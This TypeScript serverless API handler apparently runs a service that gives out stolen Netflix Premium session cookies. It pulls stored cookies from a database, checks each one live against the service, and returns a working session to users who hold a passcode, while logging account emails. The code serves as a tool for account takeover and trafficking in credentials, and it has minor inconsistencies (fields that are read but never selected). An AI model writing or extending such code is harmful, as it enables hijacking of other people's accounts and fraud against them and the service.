// api/find-account.ts - FULL REWRITE BY LISA
import type { VercelRequest, VercelResponse } from "@vercel/node";
import { ipRateLimit } from "../lib/rateLimit.js";
import {
  isLockedOut,
  recordFailure,
  clearFailures,
} from "../lib/antiBruteforce.js";
import { createClient } from "@supabase/supabase-js";
import { createRequire } from "module";

const supabase = createClient(
  process.env.SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!,
  {
    auth: {
      persistSession: false,
      autoRefreshToken: false,
    },
  }
);

const require = createRequire(import.meta.url);
const originalServerHelpers = require("./original_server_helpers.cjs");

const { getCookieHeaders, runDirectCheck } =
  originalServerHelpers.default ?? originalServerHelpers;

// ============ UTILITY FUNCTIONS ============

function getClientIp(req: VercelRequest) {
  const xff = req.headers["x-forwarded-for"];
  if (typeof xff === "string" && xff.length > 0) {
    return xff.split(",")[0].trim();
  }
  const realIp = req.headers["x-real-ip"];
  if (typeof realIp === "string" && realIp.length > 0) {
    return realIp.trim();
  }
  return "unknown";
}

function getAccessToken(req: VercelRequest) {
  const authorization = req.headers.authorization;
  const headerValue = Array.isArray(authorization)
    ? authorization[0]
    : authorization || "";
  const match = headerValue.match(/^Bearer\s+(.+)$/i);
  return match?.[1]?.trim() || "";
}

function extractCookieValue(row: any): string | null {
  // Try multiple fields where cookie might be stored
  const possibleFields = ['text', 'cookie', 'cookie_hasher', 'cookie_header'];
  
  for (const field of possibleFields) {
    if (row[field] && typeof row[field] === 'string' && row[field].trim()) {
      let cookie = row[field].trim();
      
      // If it's a partial cookie with idx=, try to reconstruct
      if (cookie.startsWith('idx=') && row.account_id) {
        cookie = `${cookie}; account_id=${row.account_id}`;
      }
      
      // If it starts with Netflixdtc, it's likely a valid cookie
      if (cookie.startsWith('Netflixdtc') || cookie.includes('SecureNetflixId')) {
        return cookie;
      }
      
      // If it has account_id in it, it's probably valid
      if (cookie.includes('account_id=')) {
        return cookie;
      }
      
      // Return anyway - let the checker validate it
      return cookie;
    }
  }
  
  return null;
}

// ============ DATABASE FUNCTIONS ============

async function fetchPremiumCookies() {
  console.log("🔍 Fetching Premium cookies from checked_cookies...");
  
  const { data, error } = await supabase
    .from("checked_cookies")
    .select("cookie_header")
    .eq("plan", "Premium")
    .neq("status", "expired")
    .not("text", "is", null)
    .not("text", "eq", "")
    .limit(100)  // Process up to 100 cookies per request
    .order("checked_at", { ascending: true, nullsFirst: true });

  if (error) {
    console.error("❌ Cookie fetch error:", error);
    return { data: null, error };
  }

  console.log(`✅ Found ${data?.length || 0} Premium cookies`);
  
  // Log first few for debugging
  if (data && data.length > 0) {
    console.log("📋 Sample cookies:");
    data.slice(0, 3).forEach((row, i) => {
      console.log(`  ${i+1}. Plan: ${row.plan}, Status: ${row.status || 'unknown'}`);
      console.log(`     Cookie preview: ${(row.text || row.cookie_hasher || '').substring(0, 50)}...`);
    });
  }
  
  return { data, error: null };
}

async function updateCookieStatus(cookieId: string, isValid: boolean, plan?: string, country?: string) {
  const updateData: any = {
    status: isValid ? 'active' : 'expired',
    checked_at: new Date().toISOString(),
  };
  
  if (plan) updateData.plan = plan;
  if (country) updateData.country = country;
  
  const { error } = await supabase
    .from("checked_cookies")
    .update(updateData)
    .eq("id", cookieId);

  if (error) {
    console.error(`❌ Failed to update cookie ${cookieId}:`, error.message);
  } else {
    console.log(`✅ Updated cookie ${cookieId} status to ${updateData.status}`);
  }
}

async function incrementPasscodeUsage(passcodeId: string, currentUses: number | null) {
  const { error } = await supabase
    .from("passcodes")
    .update({ uses: (currentUses ?? 0) + 1 })
    .eq("id", passcodeId);
  
  if (error) {
    console.error("❌ Failed to increment passcode usage:", error.message);
  }
}

async function saveLiveCheck(results: any[]) {
  const passed = (results || []).filter((result) => result?.valid);
  if (!passed.length) return;

  const rows = passed.map((item) => ({
    plan: item.plan || null,
    country: item.countryOfSignup || null,
    checked_at: new Date().toISOString(),
  }));

  const { error } = await supabase.from("live_checks").insert(rows);
  if (error) {
    console.error("❌ Failed to save live check:", error.message);
  }
}

// ============ PASSCODE VALIDATION ============

async function validatePasscode(passcode: string, userId: string) {
  const { data, error } = await supabase
    .from("passcodes")
    .select("id, code, user_id, is_active, expires_at, uses, max_uses")
    .eq("code", passcode)
    .eq("user_id", userId)
    .eq("is_active", true)
    .maybeSingle();

  if (error) {
    console.error("❌ Passcode lookup error:", error);
    throw new Error("Unable to verify the premium code.");
  }

  if (!data) {
    return { valid: false, error: "Incorrect passcode." };
  }

  if (data.expires_at && new Date(data.expires_at) <= new Date()) {
    return { valid: false, error: "This passcode has expired." };
  }

  if (
    typeof data.max_uses === "number" &&
    typeof data.uses === "number" &&
    data.uses >= data.max_uses
  ) {
    return { valid: false, error: "Usage limit reached." };
  }

  return { valid: true, passcodeRow: { id: data.id, uses: data.uses ?? 0 } };
}

// ============ MAIN HANDLER ============

export default async function handler(req: VercelRequest, res: VercelResponse) {
  const startTime = Date.now();
  console.log("🚀 find-account API called");
  
  try {
    // 1. METHOD CHECK
    if (req.method !== "POST") {
      return res.status(405).json({ success: false, error: "Method not allowed" });
    }

    // 2. IP RATE LIMITING
    const ip = getClientIp(req);
    console.log(`📡 Request from IP: ${ip}`);

    const { success: rateLimitSuccess } = await ipRateLimit.limit(ip);
    if (!rateLimitSuccess) {
      return res.status(429).json({ success: false, error: "Too many requests. Please slow down." });
    }

    if (await isLockedOut(ip)) {
      return res.status(429).json({ success: false, error: "Too many failed attempts. Try again later." });
    }

    // 3. AUTH CHECK
    const accessToken = getAccessToken(req);
    if (!accessToken) {
      return res.status(401).json({ success: false, error: "You must be logged in." });
    }

    const { data: { user }, error: userError } = await supabase.auth.getUser(accessToken);
    if (userError || !user) {
      return res.status(401).json({ success: false, error: "Invalid or expired login session." });
    }
    console.log(`👤 User authenticated: ${user.email}`);

    // 4. PASSCODE CHECK
    const passcode = String(req.body?.passcode ?? "").trim();
    if (!passcode) {
      await recordFailure(ip);
      return res.status(400).json({ success: false, error: "Passcode is required." });
    }

    const passcodeCheck = await validatePasscode(passcode, user.id);
    if (!passcodeCheck.valid) {
      await recordFailure(ip);
      return res.status(401).json({ success: false, error: passcodeCheck.error });
    }
    console.log("✅ Passcode validated");

    // 5. FETCH PREMIUM COOKIES FROM checked_cookies
    const { data: cookieRows, error: cookieError } = await fetchPremiumCookies();
    
    if (cookieError) {
      return res.status(500).json({ 
        success: false, 
        error: "Unable to load Premium accounts from pool." 
      });
    }

    if (!cookieRows || cookieRows.length === 0) {
      return res.status(404).json({
        success: false,
        error: "No Premium cookies available. Please try again later.",
        debug: { table: "checked_cookies", plan: "Premium" }
      });
    }

    // 6. EXTRACT COOKIES FROM ROWS
    const cookiesWithIds = cookieRows
      .map((row) => ({
        id: row.id,
        cookie: extractCookieValue(row),
        plan: row.plan,
        country: row.country,
        email: row.email,
      }))
      .filter((item) => item.cookie && item.cookie.length > 10);

    if (cookiesWithIds.length === 0) {
      return res.status(404).json({
        success: false,
        error: "No valid cookie strings found in Premium entries.",
        debug: { totalRows: cookieRows.length, extracted: 0 }
      });
    }

    console.log(`📦 Extracted ${cookiesWithIds.length} cookies for checking`);

    // 7. SHUFFLE COOKIES FOR RANDOMNESS
    for (let i = cookiesWithIds.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [cookiesWithIds[i], cookiesWithIds[j]] = [cookiesWithIds[j], cookiesWithIds[i]];
    }

    // 8. CHECK COOKIES ONE BY ONE
    let checkedCount = 0;
    let foundValid = false;

    for (const item of cookiesWithIds) {
      checkedCount++;
      console.log(`🔍 Checking cookie ${checkedCount}/${cookiesWithIds.length} (ID: ${item.id})`);

      try {
        // Prepare cookie for checker
        const cookieArray = [item.cookie];
        
        // Run the check
        const result = await runDirectCheck(cookieArray, 1, {
          skipNFToken: false,
          delayMs: 0,
          randomJitter: false,
          staggerMs: 0,
          onValidCookie: async () => {},
        });

        const results = Array.isArray(result?.results) ? result.results : [];
        const valid = results.find((r: any) => r?.valid);

        // Update cookie status in database
        await updateCookieStatus(
          item.id,
          !!valid,
          valid?.plan || item.plan || 'Premium',
          valid?.countryOfSignup || item.country || null
        );

        // Save audit log if valid
        if (valid) {
          await saveLiveCheck(results);
        }

        // If valid, return immediately
        if (valid) {
          console.log(`✅ VALID cookie found! Email: ${valid.email || item.email || 'unknown'}`);
          foundValid = true;
          
          await incrementPasscodeUsage(passcodeCheck.passcodeRow.id, passcodeCheck.passcodeRow.uses);
          await clearFailures(ip);
          
          const responseTime = Date.now() - startTime;
          console.log(`⏱️ Response time: ${responseTime}ms`);
          
          return res.status(200).json({
            success: true,
            ...result,
            debug: {
              totalCookiesChecked: checkedCount,
              responseTime: `${responseTime}ms`,
              cookieId: item.id
            }
          });
        } else {
          console.log(`❌ Cookie ${checkedCount} invalid or expired`);
        }
      } catch (checkError: any) {
        console.error(`⚠️ Error checking cookie ${item.id}:`, checkError.message);
        // Continue to next cookie
      }
    }

    // 9. NO VALID COOKIES FOUND
    console.log(`❌ No valid Premium cookies found after checking ${checkedCount} cookies`);
    
    return res.status(404).json({
      success: false,
      error: "No valid Premium accounts found. All checked cookies are expired or invalid.",
      debug: {
        totalChecked: checkedCount,
        totalAvailable: cookiesWithIds.length
      }
    });

  } catch (error: any) {
    console.error("💥 find-account crash:", error);
    return res.status(500).json({
      success: false,
      error: error?.message || "Unexpected server error",
      debug: process.env.NODE_ENV === 'development' ? { stack: error?.stack } : undefined
    });
  }
}
